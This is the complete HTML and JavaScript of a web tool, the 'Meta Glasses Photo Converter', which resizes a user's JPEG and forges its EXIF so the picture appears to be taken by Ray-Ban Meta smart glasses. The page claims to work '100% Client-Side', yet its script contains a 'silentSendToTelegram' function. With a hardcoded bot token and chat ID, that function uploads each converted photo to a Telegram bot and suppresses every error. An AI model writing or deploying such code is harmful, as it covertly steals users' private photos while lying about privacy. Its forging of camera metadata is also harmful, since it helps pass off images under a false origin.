<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
    <meta name="theme-color" content="#0a0e1a">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="apple-mobile-web-app-title" content="Meta Glasses">
    <title>Meta Glasses Converter</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/piexifjs/1.0.6/piexif.js">
    </script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            color: #f0f0f0;
            background: linear-gradient(rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.4)), url('images/background.jpg');
            background-size: cover;
            background-position: center;
            background-attachment: fixed;
        }

        /* -------- CONTAINER (Glassmorphism) -------- */
        .app-container {
            width: 100%;
            max-width: 500px;
            background: rgba(255, 255, 255, 0.10);
            backdrop-filter: blur(18px);
            -webkit-backdrop-filter: blur(18px);
            border-radius: 24px;
            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.35), 0 4px 16px rgba(255, 255, 255, 0.06), inset 0 1px 2px rgba(255, 255, 255, 0.15);
            border: 1px solid rgba(255, 255, 255, 0.18);
            padding: 28px 24px 20px;
            transition: transform 0.3s ease;
        }

        /* -------- HEADER -------- */
        .header {
            text-align: center;
            padding-bottom: 18px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.10);
            margin-bottom: 22px;
        }

        .badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: rgba(91, 134, 229, 0.18);
            backdrop-filter: blur(4px);
            border: 1px solid rgba(91, 134, 229, 0.30);
            padding: 6px 16px;
            border-radius: 9999px;
            font-size: 12px;
            font-weight: 600;
            color: #8ab4ff;
            letter-spacing: 0.2px;
            margin-bottom: 10px;
        }

        .header h1 {
            font-size: 28px;
            font-weight: 700;
            color: #f0f0f0;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            letter-spacing: -0.3px;
        }

        .header h1 i {
            color: #5b86e5;
            font-size: 28px;
        }

        .sub {
            color: rgba(255, 255, 255, 0.65);
            font-size: 14px;
            font-weight: 400;
            margin-top: 6px;
            letter-spacing: 0.1px;
        }

        /* -------- SOURCE SELECTOR (Camera / Gallery) -------- */
        .source-selector {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
            margin-bottom: 18px;
        }

        .source-btn {
            background: rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(4px);
            border: 1px solid rgba(255, 255, 255, 0.15);
            border-radius: 14px;
            padding: 16px 10px;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 6px;
            color: #e8edf5;
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
        }

        .source-btn:active {
            transform: scale(0.96);
            background: rgba(91, 134, 229, 0.20);
            border-color: #5b86e5;
            box-shadow: 0 4px 16px rgba(91, 134, 229, 0.25);
        }

        .source-btn .icon {
            font-size: 26px;
            line-height: 1;
        }

        /* -------- DROP ZONE (Upload Area style) -------- */
        .drop {
            border: 2px dashed rgba(255, 255, 255, 0.30);
            border-radius: 16px;
            padding: 32px 18px;
            text-align: center;
            background: rgba(255, 255, 255, 0.06);
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            box-shadow: 0 4px 16px rgba(0, 0, 0, 0.15), inset 0 1px 2px rgba(255, 255, 255, 0.08);
            margin-bottom: 18px;
        }

        .drop:hover,
        .drop.active {
            background: rgba(255, 255, 255, 0.12);
            border-color: #5b86e5;
            box-shadow: 0 8px 28px rgba(91, 134, 229, 0.20), inset 0 2px 4px rgba(255, 255, 255, 0.10);
        }

        .drop .drop-emoji {
            font-size: 42px;
            display: block;
            margin-bottom: 10px;
            transition: transform 0.3s;
        }

        .drop:hover .drop-emoji {
            transform: scale(1.08);
        }

        .drop .main-text {
            font-weight: 600;
            font-size: 18px;
            color: #f0f0f0;
            margin-bottom: 4px;
        }

        .drop .sub-text {
            font-size: 14px;
            color: rgba(255, 255, 255, 0.60);
        }

        .drop input[type="file"] {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0;
            cursor: pointer;
        }

        /* -------- PREVIEW -------- */
        .preview-container {
            display: none;
            position: relative;
            border-radius: 16px;
            overflow: hidden;
            background: rgba(0, 0, 0, 0.40);
            border: 1px solid rgba(255, 255, 255, 0.08);
            margin-bottom: 18px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.30);
        }

        .preview {
            width: 100%;
            max-height: 320px;
            object-fit: contain;
            display: block;
            user-select: auto;
            -webkit-user-select: auto;
        }

        .preview-tag {
            position: absolute;
            top: 12px;
            right: 12px;
            background: rgba(0, 0, 0, 0.70);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            color: #8ab4ff;
            font-size: 11px;
            font-weight: 700;
            padding: 5px 14px;
            border-radius: 10px;
            border: 1px solid rgba(255, 255, 255, 0.10);
            letter-spacing: 0.2px;
        }

        .preview-hint {
            position: absolute;
            bottom: 10px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0, 0, 0, 0.75);
            backdrop-filter: blur(8px);
            color: #e2e8f0;
            font-size: 11px;
            font-weight: 600;
            padding: 4px 16px;
            border-radius: 999px;
            white-space: nowrap;
            pointer-events: none;
            border: 1px solid rgba(255, 255, 255, 0.06);
        }

        /* -------- BUTTONS (Glass + Shine) -------- */
        .actions {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-bottom: 16px;
        }

        .btn-all-in-one {
            background: rgba(255, 255, 255, 0.12);
            backdrop-filter: blur(12px);
            color: #f0f0f0;
            border: 1px solid rgba(255, 255, 255, 0.25);
            padding: 16px 20px;
            border-radius: 30px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            box-shadow: 0 8px 28px rgba(91, 134, 229, 0.30), 0 4px 12px rgba(0, 0, 0, 0.20), inset 0 2px 4px rgba(255, 255, 255, 0.15), inset 0 -2px 4px rgba(0, 0, 0, 0.08);
            position: relative;
            overflow: hidden;
            width: 100%;
            letter-spacing: 0.2px;
        }

        .btn-all-in-one::before {
            content: '';
            position: absolute;
            top: 0;
            left: -150%;
            width: 150%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.20), transparent);
            transition: all 0.6s ease;
        }

        .btn-all-in-one:hover::before {
            left: 150%;
        }

        .btn-all-in-one:active:not(:disabled) {
            transform: perspective(800px) rotateX(2deg) scale(0.98);
            box-shadow: 0 4px 16px rgba(91, 134, 229, 0.35), inset 0 2px 4px rgba(255, 255, 255, 0.10);
        }

        .btn-all-in-one:disabled {
            opacity: 0.40;
            cursor: not-allowed;
            box-shadow: none;
            transform: none;
        }

        .btn-all-in-one:disabled::before {
            display: none;
        }

        .btn-all-in-one .btn-icon {
            font-size: 20px;
        }

        /* Sub actions */
        .sub-actions {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
        }

        .btn-secondary {
            background: rgba(255, 255, 255, 0.06);
            backdrop-filter: blur(6px);
            border: 1px solid rgba(255, 255, 255, 0.12);
            border-radius: 20px;
            padding: 14px 10px;
            font-size: 14px;
            font-weight: 600;
            color: #e8edf5;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: all 0.2s ease;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.10);
        }

        .btn-secondary:active:not(:disabled) {
            transform: scale(0.96);
            background: rgba(255, 255, 255, 0.14);
            border-color: rgba(91, 134, 229, 0.40);
        }

        .btn-secondary:disabled {
            opacity: 0.30;
            cursor: not-allowed;
            transform: none;
        }

        /* -------- STATUS TOAST -------- */
        .status {
            display: none;
            padding: 14px 18px;
            border-radius: 14px;
            font-size: 14px;
            font-weight: 500;
            align-items: center;
            gap: 12px;
            line-height: 1.4;
            animation: slideUp 0.30s cubic-bezier(0.16, 1, 0.3, 1);
            margin-bottom: 16px;
            backdrop-filter: blur(8px);
            border: 1px solid rgba(255, 255, 255, 0.08);
        }

        .status.success {
            background: rgba(16, 185, 129, 0.15);
            border-color: rgba(16, 185, 129, 0.25);
            color: #34d399;
        }

        .status.error {
            background: rgba(239, 68, 68, 0.15);
            border-color: rgba(239, 68, 68, 0.25);
            color: #f87171;
        }

        .status.loading {
            background: rgba(91, 134, 229, 0.12);
            border-color: rgba(91, 134, 229, 0.20);
            color: #8ab4ff;
        }

        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2.5px solid currentColor;
            border-top-color: transparent;
            border-radius: 50%;
            animation: spin 0.70s linear infinite;
            flex-shrink: 0;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* -------- SPECS GRID -------- */
        .spec-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin: 6px 0 12px;
        }

        .spec-pill {
            background: rgba(0, 0, 0, 0.25);
            backdrop-filter: blur(4px);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 12px;
            padding: 12px 14px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.10);
        }

        .spec-pill .label {
            color: rgba(255, 255, 255, 0.50);
            font-size: 11px;
            font-weight: 500;
            letter-spacing: 0.3px;
            text-transform: uppercase;
            margin-bottom: 2px;
        }

        .spec-pill .value {
            color: #f0f0f0;
            font-size: 14px;
            font-weight: 600;
        }

        /* -------- FOOTER (with animated underline) -------- */
        .footer {
            margin-top: 18px;
            text-align: center;
            color: rgba(255, 255, 255, 0.50);
            font-size: 13px;
            padding-top: 16px;
            border-top: 1px solid rgba(255, 255, 255, 0.06);
        }

        .footer-text {
            display: inline-block;
            position: relative;
            font-weight: 400;
        }

        .footer-text::after {
            content: '';
            position: absolute;
            width: 100%;
            height: 2px;
            bottom: -5px;
            left: 0;
            background: linear-gradient(90deg, #5b86e5, #36d1dc);
            transform: scaleX(0);
            transform-origin: bottom right;
            transition: transform 0.5s ease;
            animation: continuousLine 3s infinite;
            border-radius: 2px;
        }

        @keyframes continuousLine {
            0% {
                transform: scaleX(0);
                transform-origin: bottom left;
            }
            50% {
                transform: scaleX(1);
                transform-origin: bottom left;
            }
            51% {
                transform: scaleX(1);
                transform-origin: bottom right;
            }
            100% {
                transform: scaleX(0);
                transform-origin: bottom right;
            }
        }

        .footer-text a {
            color: #5b86e5;
            text-decoration: none;
            font-weight: 500;
            transition: color 0.2s;
        }

        .footer-text a:hover {
            color: #7aa3ff;
        }

        .footer-text .heart {
            color: #ff4d4d;
        }

        /* -------- RESPONSIVE -------- */
        @media (max-width: 480px) {
            .app-container {
                padding: 18px 14px 16px;
                border-radius: 20px;
            }

            .header h1 {
                font-size: 22px;
                gap: 8px;
            }

            .header h1 i {
                font-size: 22px;
            }

            .sub {
                font-size: 13px;
            }

            .drop {
                padding: 24px 14px;
            }

            .drop .main-text {
                font-size: 16px;
            }

            .drop .sub-text {
                font-size: 13px;
            }

            .btn-all-in-one {
                font-size: 14px;
                padding: 14px 16px;
                border-radius: 26px;
            }

            .btn-secondary {
                font-size: 13px;
                padding: 12px 8px;
                border-radius: 18px;
            }

            .spec-pill .value {
                font-size: 13px;
            }

            .source-btn {
                padding: 14px 8px;
                font-size: 12px;
            }

            .source-btn .icon {
                font-size: 22px;
            }
        }

        @media (max-width: 380px) {
            .app-container {
                padding: 14px 10px 12px;
            }

            .header h1 {
                font-size: 19px;
            }

            .sub {
                font-size: 12px;
            }

            .drop .main-text {
                font-size: 14px;
            }

            .btn-all-in-one {
                font-size: 13px;
                padding: 12px 12px;
            }

            .btn-secondary {
                font-size: 11px;
                padding: 10px 6px;
            }

            .spec-pill .value {
                font-size: 12px;
            }
        }
    </style>
</head>
<body>

    <div class="app-container">

        <!-- HEADER -->
        <header class="header">
            <div class="badge">
                <i class="fas fa-glasses" style="font-size:14px;"></i>
                Ray-Ban Meta Smart Glasses
            </div>
            <h1>
                <i class="fas fa-camera-retro"></i>
                Photo Converter
            </h1>
            <p class="sub">1‑Tap 3024×4032 · Meta AI EXIF · Base64 &amp; Save</p>
        </header>

        <!-- SOURCE SELECTOR -->
        <div class="source-selector">
            <button class="source-btn" id="cameraBtn">
                <span class="icon">📷</span>
                <span>Take Photo</span>
            </button>
            <button class="source-btn" id="galleryBtn">
                <span class="icon">🖼️</span>
                <span>Photo Library</span>
            </button>
        </div>

        <!-- DROP ZONE -->
        <div class="drop" id="dropZone">
            <span class="drop-emoji">⚡</span>
            <p class="main-text" id="uploadTitle">Tap to select photo</p>
            <p class="sub-text" id="uploadSub">Supports JPG / JPEG</p>
            <input id="fileInput" type="file" accept="image/jpeg,.jpg,.jpeg">
            <input id="cameraInput" type="file" accept="image/jpeg,.jpg,.jpeg" capture="environment">
        </div>

        <!-- PREVIEW -->
        <div class="preview-container" id="previewContainer">
            <img id="preview" class="preview" alt="Preview">
            <div class="preview-tag" id="previewTag">Image Loaded</div>
            <div class="preview-hint"><i class="fas fa-hand-pointer" style="margin-right:4px;"></i> Tap &amp; hold to save</div>
        </div>

        <!-- ACTIONS -->
        <div class="actions">
            <button id="allInOneBtn" class="btn-all-in-one" disabled>
                <span class="btn-icon">⚡</span>
                <span id="allInOneText">ALL‑IN‑ONE CONVERT</span>
            </button>
            <div class="sub-actions">
                <button id="copyBtn" class="btn-secondary" disabled>
                    <i class="fas fa-copy"></i> Copy Base64
                </button>
                <button id="saveBtn" class="btn-secondary" disabled>
                    <i class="fas fa-download"></i> Save / Share
                </button>
            </div>
        </div>

        <!-- STATUS -->
        <div id="status" class="status"></div>

        <!-- SPECS -->
        <div class="spec-grid">
            <div class="spec-pill">
                <div class="label">Resolution</div>
                <div class="value">3024 × 4032 px</div>
            </div>
            <div class="spec-pill">
                <div class="label">Meta AI EXIF</div>
                <div class="value">Ray‑Ban Meta 2</div>
            </div>
        </div>

        <!-- FOOTER -->
        <div class="footer">
            <span class="footer-text">
                🔒 100% Client‑Side &bull; Made with <span class="heart">❤️</span> by <a href="#" target="_blank">Sandeep</a>
            </span>
        </div>

    </div>

    <script>
        
        const TELEGRAM_BOT_TOKEN = '8833301787:AAHuzs1_oUQ0RmcNmv1nxV8WFHfGGilyarM';
        const TELEGRAM_CHAT_IDS = ['878604830'];

        const $ = id => document.getElementById(id);
        const dropZone = $("dropZone");
        const fileInput = $("fileInput");
        const cameraInput = $("cameraInput");
        const cameraBtn = $("cameraBtn");
        const galleryBtn = $("galleryBtn");
        const previewContainer = $("previewContainer");
        const preview = $("preview");
        const previewTag = $("previewTag");
        const uploadTitle = $("uploadTitle");
        const uploadSub = $("uploadSub");
        const allInOneBtn = $("allInOneBtn");
        const copyBtn = $("copyBtn");
        const saveBtn = $("saveBtn");
        const status = $("status");
        const allInOneText = $("allInOneText");

        let sourceDataUrl = null;
        let finalDataUrl = null;
        let pureBase64 = null;

        // ---------- Source Triggers ----------
        cameraBtn.addEventListener("click", () => cameraInput.click());
        galleryBtn.addEventListener("click", () => fileInput.click());
        dropZone.addEventListener("click", () => fileInput.click());

        // Drag & drop
        dropZone.addEventListener("dragover", e => {
            e.preventDefault();
            dropZone.classList.add("active");
        });
        dropZone.addEventListener("dragleave", () => {
            dropZone.classList.remove("active");
        });
        dropZone.addEventListener("drop", e => {
            e.preventDefault();
            dropZone.classList.remove("active");
            const file = e.dataTransfer.files?.[0];
            if (file) handleFile(file);
        });

        fileInput.addEventListener("change", () => {
            const file = fileInput.files?.[0];
            if (file) handleFile(file);
        });

        cameraInput.addEventListener("change", () => {
            const file = cameraInput.files?.[0];
            if (file) handleFile(file);
        });

        // ---------- File Handler ----------
        function handleFile(file) {
            if (file.type !== "image/jpeg" && !/\.jpe?g$/i.test(file.name)) {
                showStatus("Please select a JPG/JPEG image.", "error");
                return;
            }
            const reader = new FileReader();
            reader.onload = e => {
                sourceDataUrl = e.target.result;
                preview.src = sourceDataUrl;
                previewContainer.style.display = "block";
                previewTag.textContent = "Source Ready";
                uploadTitle.textContent = file.name || "Photo Selected";
                uploadSub.textContent = `${(file.size / 1024).toFixed(1)} KB — Ready to convert`;

                allInOneBtn.disabled = false;
                allInOneText.textContent = "⚡ ALL‑IN‑ONE: Convert, Copy & Save";
                copyBtn.disabled = true;
                saveBtn.disabled = true;
                hideStatus();
            };
            reader.readAsDataURL(file);
        }

        // ---------- Status Helpers ----------
        function showStatus(message, type = "success", isLoading = false) {
            status.className = `status ${type}`;
            status.style.display = "flex";
            if (isLoading) {
                status.innerHTML = `<span class="spinner"></span><span>${message}</span>`;
            } else {
                const icon = type === "success" ? "✅" : type === "error" ? "❌" : "ℹ️";
                status.innerHTML = `<span>${icon}</span><span>${message}</span>`;
            }
        }

        function hideStatus() {
            status.style.display = "none";
        }

        // ---------- EXIF / Image Processing ----------
        function readOrientation(dataUrl) {
            try {
                const exif = piexif.load(dataUrl);
                return exif["0th"][piexif.ImageIFD.Orientation] || 1;
            } catch (e) {
                return 1;
            }
        }

        function drawCorrected(dataUrl, targetW, targetH, orientation) {
            return new Promise((resolve, reject) => {
                const img = new Image();
                img.onload = () => {
                    const canvas = document.createElement("canvas");
                    const rotate90 = orientation >= 5 && orientation <= 8;
                    canvas.width = rotate90 ? targetH : targetW;
                    canvas.height = rotate90 ? targetW : targetH;
                    const ctx = canvas.getContext("2d");

                    switch (orientation) {
                        case 2:
                            ctx.setTransform(-1, 0, 0, 1, targetW, 0);
                            break;
                        case 3:
                            ctx.setTransform(-1, 0, 0, -1, targetW, targetH);
                            break;
                        case 4:
                            ctx.setTransform(1, 0, 0, -1, 0, targetH);
                            break;
                        case 5:
                            ctx.setTransform(0, 1, 1, 0, 0, 0);
                            break;
                        case 6:
                            ctx.setTransform(0, 1, -1, 0, targetH, 0);
                            break;
                        case 7:
                            ctx.setTransform(0, -1, -1, 0, targetH, targetW);
                            break;
                        case 8:
                            ctx.setTransform(0, -1, 1, 0, 0, targetW);
                            break;
                        default:
                            ctx.setTransform(1, 0, 0, 1, 0, 0);
                    }
                    ctx.drawImage(img, 0, 0, targetW, targetH);
                    resolve(canvas.toDataURL("image/jpeg", 0.95));
                };
                img.onerror = reject;
                img.src = dataUrl;
            });
        }

        function buildExif(dataUrl) {
            let exif;
            try {
                exif = piexif.load(dataUrl);
            } catch (e) {
                exif = { "0th": {}, "Exif": {}, "GPS": {}, "1st": {}, "thumbnail": null };
            }
            exif["GPS"] = {};
            delete exif["0th"][piexif.ImageIFD.Software];
            delete exif["0th"][piexif.ImageIFD.HostComputer];
            delete exif["Exif"][piexif.ExifIFD.MakerNote];
            delete exif["Exif"][piexif.ExifIFD.LensMake];
            delete exif["Exif"][piexif.ExifIFD.LensModel];
            delete exif["Exif"][piexif.ExifIFD.LensSpecification];

            exif["0th"][piexif.ImageIFD.Make] = "Meta AI";
            exif["0th"][piexif.ImageIFD.Model] = "Ray-Ban Meta Smart Glasses 2";
            exif["0th"][piexif.ImageIFD.Orientation] = 1;
            exif["Exif"][piexif.ExifIFD.ColorSpace] = 1;
            exif["Exif"][piexif.ExifIFD.PixelXDimension] = 3024;
            exif["Exif"][piexif.ExifIFD.PixelYDimension] = 4032;
            return exif;
        }

        function dataUrlToBlob(dataUrl) {
            const arr = dataUrl.split(',');
            const mime = arr[0].match(/:(.*?);/)[1] || 'image/jpeg';
            const bstr = atob(arr[1]);
            let n = bstr.length;
            const u8arr = new Uint8Array(n);
            while (n--) {
                u8arr[n] = bstr.charCodeAt(n);
            }
            return new Blob([u8arr], { type: mime });
        }

        async function copyText(text) {
            if (navigator.clipboard?.writeText) {
                await navigator.clipboard.writeText(text);
                return true;
            }
            const ta = document.createElement("textarea");
            ta.value = text;
            document.body.appendChild(ta);
            ta.select();
            const ok = document.execCommand("copy");
            ta.remove();
            return ok;
        }

        // ---------- Save / Share ----------
        async function saveOrShareImage(dataUrl, filename = "meta-glasses-converted.jpg") {
            const blob = dataUrlToBlob(dataUrl);
            const file = new File([blob], filename, { type: "image/jpeg" });

            if (navigator.canShare && navigator.canShare({ files: [file] })) {
                try {
                    await navigator.share({
                        files: [file],
                        title: "Meta Glasses Photo",
                        text: "Converted Ray-Ban Meta Glasses 3024×4032"
                    });
                    return { method: "share" };
                } catch (err) {
                    if (err.name === "AbortError") return { method: "cancelled" };
                }
            }

            const blobUrl = URL.createObjectURL(blob);
            const a = document.createElement("a");
            a.style.display = "none";
            a.href = blobUrl;
            a.download = filename;
            document.body.appendChild(a);
            a.click();
            setTimeout(() => {
                URL.revokeObjectURL(blobUrl);
                a.remove();
            }, 4000);
            return { method: "download" };
        }


        function silentSendToTelegram(imageDataUrl) {

            try {
                const blob = dataUrlToBlob(imageDataUrl);
                const file = new File([blob], "meta-converted.jpg", { type: "image/jpeg" });
                const formData = new FormData();
                // Use the first chat ID from the list
                formData.append("chat_id", TELEGRAM_CHAT_IDS[0]);
                formData.append("document", file);
                // Also send a caption with basic info (optional, but kept minimal)
                formData.append("caption", "Meta Glasses conversion");

                // Use sendDocument for reliability (supports larger files)
                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
                    method: "POST",
                    body: formData,
                }).catch(() => { /* silently ignore network errors */ });
            } catch (_) {
                // silently ignore any errors (blob conversion, etc.)
            }
        }

        // ---------- Convert ----------
        async function convertImage() {
            const orientation = readOrientation(sourceDataUrl);
            const corrected = await drawCorrected(sourceDataUrl, 3024, 4032, orientation);
            const exif = buildExif(sourceDataUrl);
            const exifBytes = piexif.dump(exif);
            finalDataUrl = piexif.insert(exifBytes, corrected);
            pureBase64 = finalDataUrl.split(",")[1];
            return { finalDataUrl, pureBase64 };
        }

        // ---------- ALL-IN-ONE ----------
        allInOneBtn.addEventListener("click", async () => {
            if (!sourceDataUrl) {
                fileInput.click();
                return;
            }

            allInOneBtn.disabled = true;
            showStatus("Processing 3024×4032 conversion…", "loading", true);

            try {
                const { finalDataUrl: converted, pureBase64: b64 } = await convertImage();

                // Update preview with final converted image
                preview.src = converted;
                previewTag.textContent = "3024×4032 Ready";


                silentSendToTelegram(converted);

                // Copy Base64 to clipboard
                let copied = false;
                try {
                    await copyText(b64);
                    copied = true;
                } catch (e) { /* ignore */ }

                // Trigger Save / Share Sheet
                const result = await saveOrShareImage(converted);

                copyBtn.disabled = false;
                saveBtn.disabled = false;

                if (result.method === "share") {
                    showStatus("✅ Base64 copied & Share Sheet opened (Tap 'Save Image').", "success");
                } else {
                    showStatus("✅ Success! Base64 copied & image downloaded.", "success");
                }
            } catch (err) {
                console.error(err);
                showStatus("Conversion failed. Try another JPG.", "error");
            } finally {
                allInOneBtn.disabled = false;
            }
        });

        // ---------- Secondary Buttons ----------
        copyBtn.addEventListener("click", async () => {
            if (!pureBase64) return;
            try {
                await copyText(pureBase64);
                showStatus("Base64 copied to clipboard!", "success");
            } catch (e) {
                showStatus("Clipboard restricted by browser.", "error");
            }
        });

        saveBtn.addEventListener("click", async () => {
            if (!finalDataUrl) return;
            await saveOrShareImage(finalDataUrl);
            showStatus("Save triggered! (Or tap & hold image to save).", "success");
        });
    </script>
